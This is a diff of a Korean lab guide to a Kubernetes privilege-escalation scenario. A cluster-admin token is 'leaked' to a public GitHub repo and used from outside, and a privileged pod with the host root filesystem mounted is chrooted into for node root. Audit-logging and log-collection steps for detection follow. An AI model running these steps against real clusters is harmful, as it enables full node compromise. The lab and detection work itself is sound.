@@ -1,19 +1,22 @@
-## Kubernetes 클러스터 최신 버전 침투 시나리오 (Privileged 컨테이너 이용)
+# Kubernetes Privilege-Escalation 시나리오
 
-이 문서는 Kubernetes 최신 버전 클러스터를 대상으로, 외부에서 인증 토큰 유출 → API 침투 → Privileged 컨테이너를 통한 노드 권한 획득까지의 과정을 단계별로 설명합니다.
-
----
-
-## 1. 클러스터 환경
-
-* **구성**: 마스터 1대, 워커 3대
-* **버전**: 최신 Kubernetes
+> **목표** : 유출된 ServiceAccount 토큰으로 API 침투 → `privileged` 컨테이너 배포 → 노드 **root** 권한 획득
 
 ---
 
-## 2. 사전 준비 (마스터 VM)
+## 0. 실습 클러스터
 
-1. **서비스 어카운트 및 토큰 생성** (24시간 유효)
+| 구성            | 수량                   |
+| ------------- | -------------------- |
+| Control-Plane | 1 대 (k8s-master)     |
+| Worker        | 3 대 (k8s-work1 \~ 3) |
+| Kubernetes    | v1.33.x (최신)         |
+
+---
+
+## 1. 사전 준비 (마스터 노드)
+
+### 1‑1 ServiceAccount & 토큰 발급 (24 h)
 
 ```bash
 kubectl -n kube-system create sa demo-leak
@@ -21,18 +24,20 @@ kubectl create clusterrolebinding demo-leak \
   --clusterrole=cluster-admin \
   --serviceaccount=kube-system:demo-leak
 
-kubectl -n kube-system create token demo-leak --duration=24h > /tmp/leak.token
+kubectl -n kube-system create token demo-leak --duration=24h \
+  > /tmp/leak.token
 ```
 
-2. **API 서버 방화벽 오픈** (6443포트)
+### 1‑2 API 포트 오픈 (6443/TCP)
 
-GCP 콘솔에서 설정:
+| 항목            | 값                     |
+| ------------- | --------------------- |
+| Name          | `allow-demo-6443`     |
+| Direction     | Ingress               |
+| Source IP     | `<YOUR_PUBLIC_IP>/32` |
+| Protocol/Port | `tcp:6443`            |
 
-* Name: `allow-demo-6443`
-* Source IP: `<YOUR_IP>/32`
-* Protocol/Port: `tcp:6443`
-
-3. **토큰 확인**
+### 1‑3 토큰 내용 확인
 
 ```bash
 cat /tmp/leak.token
@@ -40,34 +45,37 @@ cat /tmp/leak.token
 
 ---
 
-## 3. 토큰 유출 시나리오 (GitHub)
+## 2. 토큰 유출 시뮬레이션 (GitHub Public Repo)
 
 ```bash
-cd ~/demo-leak
+mkdir ~/demo-leak && cd ~/demo-leak
 echo "## 토큰 유출 테스트" > README.md
 cat /tmp/leak.token >> README.md
-git add README.md
-git commit -m "leak kube token"
-git push origin main
+git init
+git remote add origin git@github.com:<USER>/demo-leak.git
+git add README.md && git commit -m "leak kube token"
+git push -u origin main
 ```
 
 ---
 
-## 4. 외부에서 침투
-
-### 환경설정
+## 3. 공격 단계 (외부 PC)
 
 ```bash
+# kubectl 설치 (macOS 예시)
 brew install kubectl
+
+# 환경변수
 TOKEN="$(curl -s https://raw.githubusercontent.com/<USER>/demo-leak/main/README.md | tail -1)"
 API="https://34.64.60.22:6443"
 
+# 인증 성공 테스트
 kubectl --token "$TOKEN" --server "$API" --insecure-skip-tls-verify get ns
 ```
 
-### 공격용 YAML 생성 및 배포
+### 3‑1 privileged Pod YAML 작성
 
-`privileged-shell.yaml` 생성:
+`privileged-shell.yaml`
 
 ```yaml
 apiVersion: v1
@@ -84,66 +92,121 @@ spec:
   hostPID: true
   hostNetwork: true
   containers:
-    - name: attacker-shell
-      image: alpine:latest
-      securityContext:
-        privileged: true
-      command: ["/bin/sh", "-c", "sleep 3600"]
-      volumeMounts:
-        - name: host-root
-          mountPath: /host
-  volumes:
+  - name: attacker-shell
+    image: alpine:latest
+    securityContext:
+      privileged: true
+    command: ["/bin/sh", "-c", "sleep 3600"]
+    volumeMounts:
     - name: host-root
-      hostPath:
-        path: /
+      mountPath: /host
+  volumes:
+  - name: host-root
+    hostPath:
+      path: /
 ```
 
-배포:
+**배포 & 쉘 획득**
 
 ```bash
-kubectl --token "$TOKEN" --server="$API" --insecure-skip-tls-verify apply -f privileged-shell.yaml
-```
+kubectl --token "$TOKEN" --server "$API" \
+  --insecure-skip-tls-verify apply -f privileged-shell.yaml
 
-### 파드 접속 후 노드 권한 획득 증명
+kubectl --token "$TOKEN" --server "$API" \
+  --insecure-skip-tls-verify -n privileged-poc exec -it privileged-shell -- sh
 
-파드 접근:
-
-```bash
-kubectl --token "$TOKEN" --server="$API" --insecure-skip-tls-verify -n privileged-poc exec -it privileged-shell -- sh
-```
-
-노드 Shell 접근:
-
-```bash
+# 노드 root 전환
 chroot /host /bin/bash
-
-# 권한 증명
-whoami
-id
-hostname
+whoami   # → root
 ```
 
 ---
 
-## 5. 정리
+## 4. (선택) 감사 로그 활성화 — 탐지용
 
-외부 PC에서 자원 삭제:
+### 4‑1 정책 파일 `/etc/kubernetes/audit-policy.yaml`
+
+```yaml
+apiVersion: audit.k8s.io/v1
+kind: Policy
+rules:
+  - level: RequestResponse
+```
+
+### 4‑2 kube‑apiserver 매니페스트 수정 `/etc/kubernetes/manifests/kube-apiserver.yaml`
+
+```yaml
+# command 플래그
+- --audit-policy-file=/etc/kubernetes/audit-policy.yaml
+- --audit-log-path=/var/log/kubernetes/audit.log
+- --audit-log-maxage=30
+- --audit-log-maxbackup=10
+- --audit-log-maxsize=100
+
+# volumeMounts
+- name: audit-policy
+  mountPath: /etc/kubernetes/audit-policy.yaml
+  readOnly: true
+- name: audit-logs
+  mountPath: /var/log/kubernetes
+
+# volumes
+- name: audit-policy
+  hostPath:
+    path: /etc/kubernetes/audit-policy.yaml
+    type: File
+- name: audit-logs
+  hostPath:
+    path: /var/log/kubernetes
+    type: DirectoryOrCreate
+```
+
+### 4‑3 로그 확인
 
 ```bash
+tail -f /var/log/kubernetes/audit.log
+```
+
+---
+
+## 5. Vector 로그 수집 예시
+
+| 대상          | 경로                              |
+| ----------- | ------------------------------- |
+| Audit       | `/var/log/kubernetes/audit.log` |
+| 컨테이너 stdout | `/var/log/containers/*.log`     |
+
+`vector.toml`
+
+```toml
+[sources.audit]
+  type    = "file"
+  include = ["/var/log/kubernetes/audit.log"]
+
+[sources.containers]
+  type    = "file"
+  include = ["/var/log/containers/*.log"]
+
+[sinks.loki]
+  type     = "loki"
+  inputs   = ["audit", "containers"]
+  endpoint = "http://loki.example.com:3100"
+```
+
+---
+
+## 6. 정리 (Cleanup)
+
+```bash
+# 외부 PC
 kubectl delete -f privileged-shell.yaml
 kubectl delete ns privileged-poc
-```
 
-마스터에서 자원 삭제:
-
-```bash
+# 마스터 노드
 kubectl -n kube-system delete sa demo-leak
 kubectl delete clusterrolebinding demo-leak
-```
 
-GCP 방화벽 규칙 삭제:
-
-```bash
+# GCP 방화벽
 gcloud compute firewall-rules delete allow-demo-6443
 ```
 
